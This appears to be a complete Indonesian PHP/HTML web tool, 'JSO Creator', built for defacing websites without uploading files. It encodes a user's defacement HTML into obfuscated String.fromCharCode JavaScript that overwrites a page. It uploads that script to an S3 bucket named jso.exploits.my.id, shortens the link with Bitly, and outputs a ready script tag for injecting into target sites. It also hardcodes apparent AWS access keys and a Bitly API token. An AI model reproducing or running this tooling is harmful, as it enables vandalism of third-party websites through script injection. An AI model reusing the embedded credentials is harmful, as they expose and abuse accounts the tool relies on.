<!DOCTYPE html>
<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
<head>
<title>[+] JSO Creator [+]</title>
<meta name="description" content="- JSO Creator -" />
<body bgcolor="#1e1e1e" text="white">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

select {
  background: transparent;
  color: #ffffff;
}

select option {
  background-color: #1e1e1e}
input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
</style>
<script>
    function runCharCodeAt() {
        input = document.charCodeAt.input.value;
        output = "";
        for(i=0; i<input.length; ++i) {
            if (output != "") output += ", ";
            output += input.charCodeAt(i);
        }
        document.charCodeAt.output.value = output;
    }
</script>
</head>
<body>
<center>
    <font face=courier size=5>JSO Creator</font><br><font face="Courier">Alternatif deface tanpa perlu upload file</font><hr>
    <form name="charCodeAt" method="post">
        <textarea name="input" placeholder="Script Deface"></textarea><br><br>
        <input type="button" class="njir" onclick="runCharCodeAt()" value="Convert"><br><br>
        <textarea name="output" placeholder="Hasil Convert" readonly></textarea><br><br>
        <input type="submit" class="njir" name="submit" value="Auto Create">
    </form>
    <br><br>
<?php

$lib = "/tmp/tempku/aws.phar";

if (!file_exists($lib) || filesize($lib) < 1) {
  if (file_put_contents($lib, check("https://docs.aws.amazon.com/aws-sdk-php/v3/download/aws.phar")) !== false) {
    if (filesize($lib) < 1 || !file_exists($lib)) {
      die("Tools belum terinstall ! Silahkan Infokan ke Owner !");
    }
  } else {
    die("Tools belum terinstall ! Silahkan Infokan ke Owner !");
  }
}

require $lib;
//require "/tmp/aws.phar";

if (isset($_POST['submit'])) {
  ob_implicit_flush();ob_end_flush();
  echo "<hr>";
  $tmp = @stream_get_meta_data(tmpfile())['uri'];
  if (isset($_POST['output'])) {
    $output = $_POST['output'];
    $kode = 'document.documentElement.innerHTML=String.fromCharCode('.$output.')';
    $file = rand().".js";
    if (file_put_contents($tmp, $kode) !== false) {
      $aws = awsup($tmp, $file);
      if (preg_match("/ObjectURL/i", $aws)) {
        $url = "https://jso.exploits.my.id/".$file;
        echo "<font size=2 face=courier>Auto Create Berhasil !</font><br><br>";
        echo "<font face=courier><b>Versi Asli</b><br><textarea style='width: 365px; border: none; resize: none; height: 50px;' onclick='this.focus();this.select()' readonly><script src=".$url."></script></textarea><br>";
        $bit = bitly($url);
        $bit = json_decode($bit, true);
        if (!empty($bit['link'])) {
          echo "<font face=courier><b>Versi Pendek</b><br><textarea style='width: 365px; border: none; resize: none; height: 50px;' onclick='this.focus();this.select()' readonly><script src=".$bit['link']."></script></textarea>";
        }
      } else {
        echo "Tools Error ! Silahkan Infokan Owner !";
      }
    }
  }
}

function bitly($web) {
  $ch = curl_init("https://api-ssl.bitly.com/v4/bitlinks");
  curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['long_url' => $web]));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer 56d16cd04310b9597282044476a22a8b8694a91b", "Content-Type: application/json"]);
  return curl_exec($ch);
  curl_close($ch);
}

function awsup($file, $key) {
  $s3 = new Aws\S3\S3Client(['region'  => 'ap-southeast-1', 'version' => 'latest', 'credentials' => ['key' => "AKIAYEX6PUD76TYN4HVZ", 'secret' => "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",]]);
  $result = $s3->putObject(['Bucket' => 'jso.exploits.my.id', 'Key' => $key, 'SourceFile' => $file]);
  return $result;
}

function check($web) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $web);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, ".rand().") Chrome/92.0.4515.131 Safari/537.36");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15); 
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    return curl_exec($ch);
    curl_close($ch);
}


?>
<hr>
<font size=3>Unknown45 - 2021
 </center>
</body>
</html>